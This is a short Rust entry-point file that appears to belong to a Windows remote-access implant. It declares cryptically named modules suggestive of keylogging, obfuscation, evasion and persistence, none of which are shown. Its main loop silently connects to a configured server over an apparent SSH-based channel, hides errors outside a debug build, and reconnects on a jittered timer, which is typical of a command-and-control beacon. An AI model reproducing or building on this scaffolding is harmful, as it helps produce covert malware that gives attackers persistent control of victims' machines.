mod cf;
mod dl;
mod ev;
mod hd;
mod ky;
mod ob;
mod pr;
mod pt;
mod sc;
mod sy;
mod tl;

use std::sync::Arc;

// i686-pc-windows-gnu + panic=abort leaves dangling _Unwind_Resume
// references with some mingw toolchains; with abort the symbol is never
// actually called, so a stub satisfies the linker.
#[cfg(all(target_arch = "x86", target_os = "windows"))]
#[no_mangle]
pub extern "C" fn _Unwind_Resume() -> ! {
    std::process::abort()
}

fn main() {
    ev::init();
    #[cfg(feature = "debug-log")]
    env_logger::Builder::from_env(env_logger::Env::default().default_filter_or("russh=trace")).init();
    let cfg = cf::load();
    let runtime = tokio::runtime::Builder::new_multi_thread()
        .worker_threads(2)
        .enable_all()
        .build()
        .expect("runtime");
    runtime.block_on(run(cfg));
}

async fn run(cfg: Arc<cf::Config>) {
    loop {
        match sc::connect_and_serve(&cfg).await {
            Ok(_) => {}
            Err(e) => {
                #[cfg(feature = "debug-log")]
                eprintln!("[e] {e}");
                let _ = e;
            }
        }
        // reconnect with backoff, jittered
        ev::sleep_jitter(10, 4).await;
    }
}

pub fn rand_range(max: u64) -> u64 {
    use std::time::{SystemTime, UNIX_EPOCH};
    let nanos = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .map(|d| d.subsec_nanos() as u64)
        .unwrap_or(0);
    if max == 0 { 0 } else { nanos % (max + 1) }
}
